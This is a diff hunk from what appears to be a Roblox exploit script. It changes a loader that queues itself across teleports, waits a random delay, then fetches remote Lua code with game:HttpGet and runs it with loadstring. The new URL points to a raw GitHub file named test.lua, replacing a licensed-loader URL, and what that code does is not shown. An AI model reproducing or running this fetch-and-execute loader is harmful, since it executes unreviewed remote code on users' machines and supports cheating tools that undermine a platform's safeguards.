@@ -353,7 +353,7 @@ task.spawn(function()
     if queue_on_tp then
         local loader = [[
             task.delay(math.random(5,10), function()
-                loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/869d818021af0445799bf14959327df4.lua"))()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/SellMeFish/nonono/refs/heads/main/test.lua"))()
             end)
         ]]
         queue_on_tp(loader)
